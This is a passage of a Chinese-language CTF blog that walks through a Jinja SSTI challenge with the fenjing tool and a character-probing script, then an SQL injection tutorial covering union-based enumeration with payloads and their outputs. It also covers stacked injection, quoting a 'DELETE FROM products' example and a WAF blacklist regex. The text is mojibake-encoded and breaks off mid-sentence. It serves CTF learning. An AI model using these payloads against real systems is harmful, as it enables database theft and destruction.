class="string">&#x27;è¯•ä¸€è¯•&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        css_url = url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;style.css&#x27;</span>)</span><br><span class="line">        command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> contains_forbidden_keywords(command):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;forbidden.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Loving Music&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="subst">&#123;css_url&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Loving coding&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p class=&quot;emoji&quot;&gt;ğŸ§‘â€ğŸ’»&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">&#123;command&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, command=command,css_url=css_url)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;shell.html&#x27;</span>, command=cmd)</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œä¸»è¦çš„é—®é¢˜åœ¨render_templateè¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å­˜åœ¨sstiæ¼æ´ã€‚è·¯ç”±åœ¨&#x2F;test, ç„¶åå‚æ•°æ˜¯<code>cmd</code>æœ‰GETå’ŒPOSTä¸¤ç§è¯·æ±‚ï¼Œä½†æ˜¯åªæœ‰POSTæ˜¯æœ‰ç”¨çš„ã€‚<br>å¯ä»¥ç›´æ¥ç”¨fenjingä¸€æŠŠæ¢­ã€‚fenjingæ˜¯ä¸€ä¸ªé’ˆå¯¹CTFæ¯”èµ›ä¸­Jinja SSTIç»•è¿‡WAFçš„å…¨è‡ªåŠ¨è„šæœ¬ï¼Œå¯ä»¥è‡ªåŠ¨æ”»å‡»ç»™å®šçš„ç½‘ç«™æˆ–æ¥å£ï¼Œçœå»æ‰‹åŠ¨æµ‹è¯•æ¥å£ï¼Œfuzzé¢˜ç›®WAFçš„æ—¶é—´ã€‚é¡¹ç›®åœ°å€åœ¨<a href="https://github.com/Marven11/FenJing">https://github.com/Marven11/FenJing</a><br>ç ”ç©¶äº†ä¸€ä¼šå‚æ•°ï¼Œæœ€åä¸‹è½½ä¹‹ååœ¨å‘½ä»¤è¡Œçš„æŒ‡ä»¤æ˜¯è¿™æ ·çš„</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">fenjing crack -u http:<span class="string">//node6.anna.nssctf.cn</span><span class="function">:25449</span>/test -m POST -i cmd <span class="params">--waf-keyword</span> éæ³• <span class="params">--replaced-keyword-strategy</span> avoid <span class="params">--cookies</span> <span class="string">&quot;session=eyJ1c2VyIjoidGVzdCJ9.Z-Fo-A.RdSN3LH_6-rNarEwCVVUbMn7TZs&quot;</span></span><br></pre></td></tr></table></figure>
<p>-m æŒ‡å®šè¯·æ±‚æ–¹å¼ -i æŒ‡å®šå‚æ•° â€“waf-keyword è¡¨ç¤ºå¦‚æœå‡ºç°wafç•Œé¢ä¼šå‡ºç°çš„æ–‡å­— â€“replaced-keyword-strategy å‡ºç°wafçš„æ—¶å€™çš„ç­–ç•¥ï¼Œè¿™é‡Œé€‰æ‹©ä¸ä½¿ç”¨waf(avoid) æœ€åè¦æŒ‡å®šcookie ç„¶åå¯ä»¥æ‰§è¡ŒæˆåŠŸï¼Œfenjingä¼šç»™å‡ºpayloadæˆåŠŸåè¾“å…¥cat &#x2F;flagæŒ‡ä»¤æ‰§è¡Œåå¾—åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67e16e570ba3d5a1d7e2b0ce.png"></p>
<p>å¦‚æœæ˜¯æ‰‹å·¥ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„è„šæœ¬æ‰¾åˆ°é»‘åå•å’Œç™½åå•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node6.anna.nssctf.cn:26098/test&#x27;</span></span><br><span class="line">cookie = &#123;<span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJ1c2VyIjoidGVzdCJ9.Z-FVnQ.tQJGlYJwhwKcZcqBz3bWvoNi334&#x27;</span>&#125;</span><br><span class="line">pattern = string.ascii_letters + string.digits</span><br><span class="line">pattern += <span class="string">r&#x27;[\]!@#$%^&amp;*()_+\\?\,\.&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">blacklist = []</span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ pattern ä¸­çš„å­—ç¬¦é€ä¸ªå‘é€è¯·æ±‚</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> pattern:</span><br><span class="line">    response = requests.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>: char&#125;, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt;Testing: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;æ£€æµ‹åˆ°è¾“å…¥éæ³•å­—ç¬¦&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        blacklist.append(char)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]: <span class="subst">&#123;char&#125;</span> in blacklist&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        whitelist.append(char)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]: <span class="subst">&#123;char&#125;</span> in whitelist&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;whitelist: &quot;</span>, <span class="string">&#x27;&#x27;</span>.join(whitelist))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;blacklist: &quot;</span>, <span class="string">&#x27;&#x27;</span>.join(blacklist))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥ä¸“é¢˜(æ›´æ–°ä¸­)</title>
    <url>/posts/7589.html</url>
    <content><![CDATA[<p>ctfä¸­çš„sqlæ³¨å…¥ä¸“é¢˜ç ”ç©¶ï¼Œå­¦ä¹ ä¸€äº›å¸¸è§çš„sqlæ³¨å…¥é¢˜å‹ï¼Œç¢°åˆ°æ–°çš„ç±»å‹ä¹ŸåŠ è¿›æ¥</p>
<span id="more"></span>
<p>åœ¨åˆ·å®Œä¸€äº›æ–°ç”Ÿèµ›ä¹‹åï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“è¦æ€ä¹ˆè¿›é˜¶ï¼Œé‚£å°±åˆ†é¢˜å‹æ€»ç»“ï¼Œæœ‰çš„ç±»å‹çš„é¢˜å‹å¯èƒ½æœ‰å¤šä¸ªä¾‹é¢˜ï¼Œå› ä¸ºè¿™ä¸ªç±»å‹è¦†ç›–é¢æ¯”è¾ƒå¤šï¼Œä¸åŒä¾‹é¢˜ä¹Ÿæ˜¯æœ‰ä¸åŒçš„çŸ¥è¯†ç‚¹ï¼Œåé¢æœ‰ç›¸ä¼¼çŸ¥è¯†ç‚¹çš„sqlç±»å‹é¢˜ç›®çš„ä¾‹é¢˜å°±é€‰ä¸€äº›ç»å…¸çš„ã€‚</p>
<h1 id="sqlæ³¨å…¥æ¦‚è¿°"><a href="#sqlæ³¨å…¥æ¦‚è¿°" class="headerlink" title="sqlæ³¨å…¥æ¦‚è¿°"></a>sqlæ³¨å…¥æ¦‚è¿°</h1><p>SQL æ³¨å…¥æ˜¯ä¸€ç§å°† SQL ä»£ç æ’å…¥æˆ–æ·»åŠ åˆ°åº”ç”¨ï¼ˆç”¨æˆ·ï¼‰çš„è¾“å…¥å‚æ•°ä¸­ï¼Œä¹‹åå†å°†è¿™äº›å‚æ•°ä¼ é€’ç»™åå°çš„ SQL æœåŠ¡å™¨åŠ ä»¥è§£æå¹¶æ‰§è¡Œçš„æ”»å‡»ã€‚<br>æ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹ SQL è¯­å¥ï¼Œè¯¥è¿›ç¨‹å°†ä¸æ‰§è¡Œå‘½ä»¤çš„ç»„ä»¶ï¼ˆå¦‚æ•°æ®åº“æœåŠ¡å™¨ã€åº”ç”¨æœåŠ¡å™¨æˆ– WEB æœåŠ¡å™¨ï¼‰æ‹¥æœ‰ç›¸åŒçš„æƒé™ã€‚<br>å¦‚æœ WEB åº”ç”¨å¼€å‘äººå‘˜æ— æ³•ç¡®ä¿åœ¨å°†ä» WEB è¡¨å•ã€cookieã€è¾“å…¥å‚æ•°ç­‰æ”¶åˆ°çš„å€¼ä¼ é€’ç»™ SQL æŸ¥è¯¢ï¼ˆè¯¥æŸ¥è¯¢åœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼‰ä¹‹å‰å·²ç»å¯¹å…¶è¿›è¡Œè¿‡éªŒè¯ï¼Œé€šå¸¸å°±ä¼šå‡ºç° SQL æ³¨å…¥æ¼æ´ã€‚</p>
<p>sqlæ³¨å…¥æŒ‰ç…§æ³¨å…¥ç‚¹å¯ä»¥åˆ†ä¸ºä¸‰ç±»</p>
<ul>
<li>æ•°å­—å‹æ³¨å…¥ï¼šå½“è¾“å…¥çš„å‚æ•°ä¸ºæ•´å‹çš„æ—¶å€™ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œåˆ™å¯ä»¥è®¤ä¸ºæ˜¯æ•°å­—å‹æ³¨å…¥ å¦‚<code>select * from table_name where id=&#39;1&#39;</code></li>
<li>å­—ç¬¦å‹æ³¨å…¥ï¼šå’Œæ•°å­—å‹æ°æ°ç›¸åï¼Œå½“è¾“å…¥çš„å‚æ•°ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œåˆ™å¯ä»¥è®¤ä¸ºæ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸åŒçš„ä¸€ç‚¹æ˜¯ï¼Œæ•°å­—å‹æ³¨å…¥å‚æ•°éœ€è¦é—­åˆï¼Œè€Œå­—ç¬¦å‹æ³¨å…¥å‚æ•°ä¸éœ€è¦é—­åˆã€‚<code>select * from BaiMao table_name id=&#39; 1&#39; &#39;</code></li>
<li>æœç´¢å‹æ³¨å…¥ï¼šç½‘ç«™å…·æœ‰æœç´¢åŠŸèƒ½ï¼Œä½†å¼€å‘äººå‘˜å¿½ç•¥äº†å¯¹å˜é‡ã€å…³é”®å­—ã€å‘½ä»¤çš„è¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´äº†æ³¨å…¥å¯èƒ½ï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºæ–‡æœ¬æ¡†æ³¨å…¥ã€‚</li>
</ul>
<p>å¸¸è§çš„sqlæ³¨å…¥æ‰‹æ³•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”</span><br><span class="line">åŸºäºæŠ¥é”™çš„<span class="keyword">SQL</span>æ³¨å…¥</span><br><span class="line">è”åˆæŸ¥è¯¢æ³¨å…¥</span><br><span class="line">å †æŸ¥è¯¢æ³¨å…¥</span><br><span class="line"><span class="keyword">SQL</span>ç›²æ³¨</span><br><span class="line">åŸºäºå¸ƒå°”<span class="keyword">SQL</span>ç›²æ³¨</span><br><span class="line">åŸºäºæ—¶é—´<span class="keyword">SQL</span>ç›²æ³¨</span><br><span class="line">åŸºäºæŠ¥é”™<span class="keyword">SQL</span>ç›²æ³¨</span><br><span class="line">åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥</span><br><span class="line">ä¸€é˜¶æ³¨å…¥</span><br><span class="line">äºŒé˜¶æ³¨å…¥</span><br><span class="line">ä¸€é˜¶æ³¨å°„æ˜¯æŒ‡è¾“å…¥çš„æ³¨å°„è¯­å¥å¯¹ WEB ç›´æ¥äº§ç”Ÿäº†å½±å“ï¼Œå‡ºç°äº†ç»“æœï¼›äºŒé˜¶æ³¨å…¥ç±»ä¼¼å­˜</span><br><span class="line">å‚¨å‹ XSSï¼Œæ˜¯æŒ‡è¾“å…¥æäº¤çš„è¯­å¥ï¼Œæ— æ³•ç›´æ¥å¯¹ WEB åº”ç”¨ç¨‹åºäº§ç”Ÿå½±å“ï¼Œé€šè¿‡å…¶å®ƒçš„è¾…åŠ©é—´</span><br><span class="line">æ¥çš„å¯¹ WEB äº§ç”Ÿå±å®³ï¼Œè¿™æ ·çš„å°±è¢«ç§°ä¸ºæ˜¯äºŒé˜¶æ³¨å…¥.</span><br><span class="line">åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®</span><br><span class="line">é€šå…³ç”¨æˆ·è¾“å…¥çš„å•è¡¨åŸŸæ³¨å°„</span><br><span class="line">é€šè¿‡cookieæ³¨å°„</span><br><span class="line">é€šå…³æœåŠ¡å™¨å˜é‡æ³¨å°„ï¼ˆåŸºäºå¤´éƒ¨ä¿¡æ¯çš„æ³¨å…¥ï¼‰</span><br></pre></td></tr></table></figure></div>

<h1 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h1><p>è¿™æ˜¯æœ€ç®€å•çš„ä¸€ç§sqlæ³¨å…¥ï¼Œåˆ©ç”¨unionè¯­å¥è”åˆæŸ¥è¯¢<br>ä¸¾ä¸€é“ç®€å•çš„sqlé¢˜è¯´è¯´  swpuctf2021æ–°ç”Ÿèµ›_ezsql<br>å°é¢æ˜¯ä¸€å¼ æ°å“¥hhhhï¼Œç„¶åæç¤ºè¾“å…¥ç‚¹ä¸œè¥¿ï¼Œè¿™ä¸ªæ ‡ç­¾é¡µçš„æ ‡é¢˜æé†’<code>å‚æ•°æ˜¯wllm</code><br>å…ˆè¯•è¯•æœ‰æ²¡æœ‰é”™è¯¯å›æ˜¾ï¼Œå‘ç°æ˜¯æœ‰çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28899/?wllm=-1&#x27;</span><br><span class="line"></span><br><span class="line">You have an error in your SQ<span class="class">L syntax;</span><span class="built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæˆ‘ç›´æ¥è¾“å…¥<code>?wllm=1&#39; or 1=1 order by 1#</code>è¿˜æ˜¯è¿™ä¸ªé”™è¯¯æé†’ï¼Œè¿™æ˜¯æ˜¯å› ä¸ºç”¨#è¿™ä¸ªæ³¨é‡Šç¬¦åœ¨è¿™é¢˜ä¸é€‚ç”¨<br>åœ¨æœ¬é¢˜ä¸­ç”¨çš„æ³¨é‡Šæ˜¯<code>--+</code><br>sqlä¸­çš„æ³¨é‡Šç¬¦ï¼š<code>--</code>å•è¡Œæ³¨é‡Šç¬¦ ï¼Œ åé¢è¦åŠ ç©ºæ ¼<br>             <code>#</code>  mysqlæ³¨é‡Šç¬¦ï¼Œåªåœ¨mysqlä¸­<br>             <code>/**/</code> å¤šè¡Œæ³¨é‡Šç¬¦<br>è¿™é‡Œåœ¨<code>--</code>åé¢ç”¨<code>+</code>æ˜¯å› ä¸ºè¿™é‡Œç©ºæ ¼åœ¨urlä¸­ä¼šè¢«urlç¼–ç ï¼Œæ‰€ä»¥ç”¨<code>+</code>ä»£æ›¿ç©ºæ ¼</p>
<ol>
<li>æŸ¥å­—æ®µ</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">wllm</span>=1&#x27; <span class="keyword">or</span> <span class="attribute">1</span>=1 order by 2 --+</span><br><span class="line"></span><br><span class="line">Your Login name:xxx</span><br><span class="line">Your Password:yyy</span><br><span class="line"></span><br><span class="line">?<span class="attribute">wllm</span>=1&#x27; <span class="keyword">or</span> <span class="attribute">1</span>=1 order by 4 --+</span><br><span class="line">Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>è¯´æ˜ä¸€å…±æœ‰ä¸‰ä¸ªå­—æ®µ<br>2. æŸ¥å›æ˜¾</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">?wllm=-<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>è¯´æ˜nameåœ¨ç¬¬äºŒåˆ— ï¼Œ passwordåœ¨ç¬¬ä¸‰åˆ—<br>3. çˆ†åº“</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> --+</span><br><span class="line">Your Login name:test_db</span><br><span class="line">Your <span class="keyword">Password</span>:<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æ•°æ®åº“å<code>test_db</code><br>4. çˆ†è¡¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="Q"><figure class="iseeu highlight /q"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database(); --+</span><br><span class="line"></span><br><span class="line">Your Login name:test_tb,users</span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°è¡¨å<code>users</code> <code>test_tb</code><br><code>group_concat</code> æ˜¯ä¸€ä¸ª MySQL å†…ç½®çš„èšåˆå‡½æ•°ï¼Œå®ƒå°†æŸ¥è¯¢ç»“æœä¸­çš„å¤šä¸ªå€¼è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<code>table_name</code> æ˜¯ <code>information_schema.tables</code> è¡¨ä¸­çš„åˆ—ï¼Œå­˜å‚¨äº†æ‰€æœ‰è¡¨çš„åå­—ã€‚<br><code>table_schema</code>ï¼šè¡¨ç¤ºæ•°æ®åº“çš„åç§°ï¼Œå³è¯¥è¡¨å±äºå“ªä¸ªæ•°æ®åº“<br>5. çˆ†å­—æ®µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;; --+</span></span><br><span class="line"><span class="string">Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span></span><br><span class="line"><span class="string">Your Password:3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;test_tb&#x27;</span>; <span class="comment">--+</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:id,flag</span><br><span class="line">Your <span class="keyword">Password</span>:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>åœ¨<code>test_tb</code>è¿™ä¸ªæ•°æ®è¡¨é‡Œé¢æœ‰flagå­—æ®µï¼Œæ‰€ä»¥ç”¨è¿™ä¸ªæ•°æ®è¡¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="string">-1</span>&#x27; union select 1,group_concat(flag),3 from test_db.test_tb; --+</span><br><span class="line">Your Login name:NSSCTF&#123;77d82ad5<span class="string">-3</span>a97<span class="string">-47</span>f0<span class="string">-9</span>c23-a4a92bc9d6f7&#125;</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ€åçŸ¥é“æ˜¯ä»€ä¹ˆæ•°æ®åº“ä»€ä¹ˆè¡¨å°±å†™from <code>$database.$table</code>å°±å¯ä»¥äº† </p>
<p>æ€»ç»“ä¸€ä¸‹ï¼Œè”åˆæ³¨å…¥çš„è§£å†³é¡ºåºæ˜¯ï¼Œæ£€æµ‹æ³¨å…¥ç‚¹-&gt;åˆ¤æ–­æ³¨å…¥ç±»å‹-&gt;æŸ¥å­—æ®µ-&gt;çˆ†åº“-&gt;çˆ†è¡¨-&gt;çˆ†å­—æ®µ<br>ç”¨åˆ°çš„å‡½æ•°å’Œè¡¨æœ‰<code>order by  union select  group_concat  information_schema.tables  table_schema  information_schema.columns  table_name</code></p>
<h1 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿ å› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼Ÿ<br>åŒºåˆ«å°±åœ¨äº union æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œçš„æ˜¯æŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š<code>1; DELETE FROM products;</code>æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰<code>Select * from products where productid=1;DELETE FROM products</code>;å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚<br>ä¸€èˆ¬å­˜åœ¨å †å æ³¨å…¥çš„éƒ½æ˜¯ç”¨<code> mysqli_multi_query()</code> å‡½æ•°æ‰§è¡Œçš„sqlè¯­å¥ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ï¼Œå¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚</p>
<h2 id="ä¾‹é¢˜1-buuctf-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨-1"><a href="#ä¾‹é¢˜1-buuctf-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨-1" class="headerlink" title="ä¾‹é¢˜1 buuctf[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1"></a>ä¾‹é¢˜1 buuctf[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1</h2><h3 id="æ–¹æ³•1-å †å æ³¨å…¥"><a href="#æ–¹æ³•1-å †å æ³¨å…¥" class="headerlink" title="æ–¹æ³•1 å †å æ³¨å…¥"></a>æ–¹æ³•1 å †å æ³¨å…¥</h3><p>å…ˆè¾“å…¥1â€™åˆ¤æ–­æ˜¯å­—ç¬¦å‹æ³¨å…¥<br><img src="https://pic1.imgdb.cn/item/67f489e8e381c3632beed3fc.png"><br>ç„¶ååˆ¤æ–­å­—æ®µæ•° è¾“å…¥<code>1&#39; order by 3#</code>æŠ¥é”™ï¼Œè¯´æ˜ä¸€å…±æœ‰ä¸¤ä¸ªå­—æ®µ<br>è¾“å…¥selectæŠ¥é”™ï¼Œå¹¶ä¸”ç»™å‡ºäº†è¿‡æ»¤çš„é»‘åå•<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>è¯´ä¸€select whereè¢«è¿‡æ»¤ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å †å æ³¨å…¥<br>è¾“å…¥ <code>1&#39;; show databases;#</code> æŸ¥çœ‹æ‰€æœ‰çš„åº“<br><img src="https://pic1.imgdb.cn/item/67f48ac3e381c3632beed457.png"><br>è¾“å…¥ <code>1&#39;; show tables;#</code> æŸ¥çœ‹æ‰€æœ‰è¡¨ ï¼Œå‘ç°æœ‰ä¸¤å¼ è¡¨ words å’Œ 1919810931114514<br><img src="https://pic1.imgdb.cn/item/67f48aeae381c3632beed46d.png"><br>ç”¨<code>1&#39;; show columns from words;#</code>æŸ¥çœ‹wordsè¡¨ä¸­çš„å­—æ®µ<br><img src="https://pic1.imgdb.cn/item/67f48b39e381c3632beed48d.png"><br>ç”¨1â€™; show columns from `1919810931114514`;#  æ³¨æ„è¿™é‡Œåœ¨mysqlä¸­æŸ¥è¯¢æ•°å­—çš„åå­—è¦åŠ ä¸Šåå¼•å·<br><img src="https://pic1.imgdb.cn/item/67f48b88e381c3632beed4b5.png"><br>å› ä¸ºç°åœ¨åªæœ‰ä¸¤å¼ è¡¨ï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“åœ¨é¦–é¡µæŸ¥è¯¢çš„æ˜¯wordsè¡¨é‡Œé¢çš„å†…å®¹ã€‚ é‚£ç°åœ¨è¦æ€ä¹ˆæŸ¥åˆ°æ•°å­—è¡¨é‡Œé¢çš„flagå­—æ®µï¼Ÿ<br>æˆ‘ä»¬éœ€è¦è®©1919810931114514æ›¿ä»£wordsè¡¨ï¼Œå› 